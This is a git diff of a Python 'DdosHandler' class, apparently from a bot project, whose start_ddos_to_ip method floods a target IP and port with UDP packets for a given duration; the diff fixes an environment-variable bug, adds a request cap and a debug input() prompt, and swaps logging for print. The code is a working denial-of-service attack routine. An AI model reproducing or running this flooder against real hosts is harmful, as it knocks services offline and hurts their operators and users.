@@ -4,12 +4,12 @@ import random
 import socket
 import time
 
-from bot.objects.Logger import Logger
+from objects.Logger import Logger
 
 
 class DdosHandler:
     MAX_REQUESTS_PER_SECOND = int(os.getenv("MAX_REQUESTS_PER_SECOND", 30))
-    DDOS_PORT = int(os.getenv("MAX_REQUESTS_PER_SECOND", 0))
+    DDOS_PORT = int(os.getenv("DDOS_PORT", 0))
 
     def __init__(self, task_id: str):
         self.task_id = task_id
@@ -22,14 +22,15 @@ class DdosHandler:
         :param duration: duration of time in seconds.
         :return: None
         """
+        input("start_ddos_to_ip started")
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         counter = 0
         start_time = time.time()
         port = self.DDOS_PORT if self.DDOS_PORT != 0 else random.randint(1, 65534)  # chooses a random port if not chosen
-        while time.time() - start_time <= duration:
-            sock.sendto(random.randbytes(1000), (ip, port))
+        while time.time() - start_time <= duration and counter < self.MAX_REQUESTS_PER_SECOND:
+            sock.sendto(bytes(random.randrange(1000)), (ip, port))
             counter += 1
-        self.logger.debug(f"DDos command finished: {counter} requests sent.")
+        print(f"DDos command finished: {counter} requests sent.")
 
     def start_ddos_to_url(self, url: str, duration):
         """
